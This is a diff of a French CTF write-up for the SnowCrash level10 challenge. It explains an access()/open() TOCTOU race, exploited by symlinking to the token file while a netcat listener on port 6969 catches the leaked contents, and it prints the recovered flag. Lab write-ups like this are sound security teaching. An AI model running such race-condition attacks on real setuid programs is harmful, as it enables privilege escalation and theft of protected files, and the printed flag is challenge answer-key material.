@@ -1,7 +1,40 @@
 
+strings level10 donne:
+
+[^_]
+%s file host
+	sends file to host if you have access to it
+Connecting to %s:6969 ..
+Unable to connect to host %s
+.*( )*.
+Unable to write banner to host %s
+Connected!
+Sending file ..
+Damn. Unable to open file
+Unable to read from file: %s
+wrote file!
+You don't have access to %s
+;*2$"
 
 
-level10@SnowCrash:/var/crash$ ./exploit.sh
+beaucoup de recherche pour rien.
+on a utilise ghidra
+on test objdump -x level10
+
+bref, level10 commence par utiliser access() pour verifier les droits du user.
+=> man access 
+NOTES
+       Warning: Using access() to check if a user is authorized to, for example, open a file before actually doing so
+       using open(2) creates a security hole, because the user might exploit the short time interval between checking
+       and  opening  the file to manipulate it.  For this reason, the use of this system call should be avoided.  (In
+       the example just described, a safer alternative would be to temporarily switch the process's effective user ID
+       to the real ID and then call open(2).)
+
+on a trouve sur le web un script qui utilise cet exploit, identifie as TOCOU.
+https://resources.infosecinstitute.com/topic/race-condition-toctou-vulnerability-lab/
+
+on creer un lien symbolique vers le token
+on bash le script ./exploit.sh
 
 You don't have access to passwdlocal
 You don't have access to passwdlocal
@@ -13,7 +46,11 @@ You don't have access to passwdlocal
 You don't have access to passwdlocal
 You don't have access to passwdlocal
 
+
+On ecoute sur le port qu'on avait identifie avec strings et ghidra
 level10@SnowCrash:~$ nc -l -k 6969
+
+
 .*( )*.
 woupa2yuojeeaaed06riuj63c
 .*( )*.
